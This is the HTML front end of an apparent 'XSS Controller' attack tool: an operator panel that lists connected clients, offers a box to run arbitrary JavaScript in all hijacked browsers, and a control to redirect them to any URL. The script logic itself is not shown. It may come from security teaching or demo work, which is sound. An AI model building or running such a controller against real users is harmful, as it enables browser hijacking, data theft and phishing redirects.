<!DOCTYPE html>
<html>
  <head>
    <title>XSS Controller Server</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body {
        font: 13px Helvetica, Arial;
      }
      h1 {
        margin-bottom: 20px;
      }
      #messages {
        list-style-type: none;
        margin: 0;
        padding: 0;
      }
      #messages li {
        padding: 5px 10px;
      }
      #messages li:nth-child(odd) {
        background: #eee;
      }
      textarea {
        display: block;
        margin-bottom: 20px;
        width: 100%;
        height: 300px;
        font: 16px Consolas, Courier, monospace;
      }
      .col {
        float: left;
        width: 50%;
        padding: 10px;
      }
    </style>
  </head>
  <body>
    <div class="col">
      <h1>XSS Controller</h1>
      <ul id="messages"></ul>
    </div>
    <div class="col">
      
      <h1>Embed Remote JavaScript</h1>
      <textarea
        id="console"
        placeholder="Enter JavaScript to run against all remote clients"
      >
      </textarea>
      <button id="eval">Remote Embed</button>

      <h1>Redirect</h1>
      <input id="redirectUri" placeholder="URL to redirect"></input>
      <button id="redirect">Redirect</button>
    </div>
  </body>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/controller.js"></script>
</html>
